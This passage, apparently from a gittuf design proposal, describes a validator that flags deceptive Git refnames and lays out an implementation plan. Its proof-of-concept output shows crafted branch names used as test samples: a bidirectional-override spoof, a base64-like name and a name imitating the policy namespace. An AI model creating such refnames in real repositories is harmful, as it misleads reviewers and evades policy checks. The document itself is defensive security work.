  Refname : 'refs/heads/patch\u202e/main'
  Mode    : enforce   Result: REJECTED
  ✗ [DENY] bidi-override
         bidirectional override characters detected: ['0x202e']

  ┌─ HIGH ENTROPY — base64-like leaf
  │  Git accepted ref:  'refs/heads/aGVsbG8td29ybGQ...'

──────────────────────────────────────────────────────────────────────
  Refname : 'refs/heads/aGVsbG8td29ybGQtdGhpcy1pcy1hLXRlc3Q='
  Mode    : enforce   Result: AUDITED
  ⚠ [WARN] high-entropy
         leaf entropy 4.72 > threshold 4.5
  ⚠ [WARN] encoding-anomalies
         Base64-like substring detected in leaf

  ┌─ NAMESPACE CONFUSION
  │  Git accepted ref:  'refs/heads/gittuf/policy-shadow'

──────────────────────────────────────────────────────────────────────
  Refname : 'refs/heads/gittuf/policy-shadow'
  Mode    : enforce   Result: REJECTED
  ✗ [DENY] deny-patterns
         matches '^refs/heads/gittuf/'

──────────────────────────────────────────────────────────────────────
PoC complete.
```

---

## Implementation

A full implementation would involve the following work items:

1. **Policy schema extension.** Add `refname-safety` as an optional field to the
   namespace rule type in gittuf's policy package. Implement serialization and
   deserialization, including unknown-field tolerance for older clients.

2. **Validator package.** Implement a `refname/safety` package in Go providing
   the `Validate(refname string, policy *RefnameSafetyPolicy) ([]Violation, error)`
   function, mirroring the Python prototype's logic. Use Go's `unicode` and
   `golang.org/x/text/unicode/norm` packages for normalization. Use
   `golang.org/x/text/unicode/confusables` or a bundled UCD confusables table for
   confusable detection.

3. **Integration into ref update path.** Invoke the validator in
   `gittuf rsl record` (and equivalent internal functions) after policy
   authorization is checked and before the RSL entry is committed.

4. **Integration into verification path.** Invoke the validator in `gittuf verify-ref`
   and report violations in verification output.

5. **RSL annotation for audit mode.** Implement annotation creation for audit-mode
   violations using the schema defined in Section 3.4.3.

6. **CLI commands.** Add `gittuf verify-refname` and `gittuf policy add-refname-safety`
   commands.

7. **Policy management commands.** Extend `gittuf policy` to surface, add, update, and
   remove `refname-safety` blocks from namespace rules.

8. **Tests.** Unit tests for each validation rule. Integration tests with a synthetic
   repository exercising the full path from ref update to RSL entry and verification.
   Fuzzing of the validator against the Unicode BMP and SMP.

9. **Documentation.** Update the gittuf policy documentation to describe `refname-safety`
   configuration. Add a security advisory note in the main documentation on treating
   refnames as untrusted outside the Git execution boundary.

---

## Changelog

* **2026-04-15:** Initial draft submitted for discussion (references issue #1251).

---

## Acknowledgements

Thanks to the gittuf maintainers for the discussion in issue #1251. The Unicode
confusable detection approach is informed by Unicode Technical Report #36 (Unicode
Security Considerations). The entropy-based heuristic is inspired by similar techniques
in secret-scanning tooling. The threat model for agentic CI/CD pipelines draws on
public research into GitHub Actions injection vulnerabilities.

---

## References

* [Git ref naming rules](https://git-scm.com/docs/git-check-ref-format)
* [Unicode Technical Report #36: Unicode Security Considerations](https://www.unicode.org/reports/tr36/)
* [Unicode Technical Standard #39: Unicode Security Mechanisms](https://www.unicode.org/reports/tr39/)
* [Unicode Normalization Forms (UAX #15)](https://www.unicode.org/reports/tr15/)
* [GitHub Actions: Security hardening — Untrusted input](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
* [gittuf design document](https://github.com/gittuf/gittuf/blob/main/docs/design-document.md)
* [gittuf issue #1251: Discuss: Refname security policy for malicious / ambiguous Git metadata](https://github.com/gittuf/gittuf/issues/1251)
* [SLSA: Supply chain Levels for Software Artifacts](https://slsa.dev/)
* [The Update Framework (TUF) specification](https://theupdateframework.github.io/specification/latest/)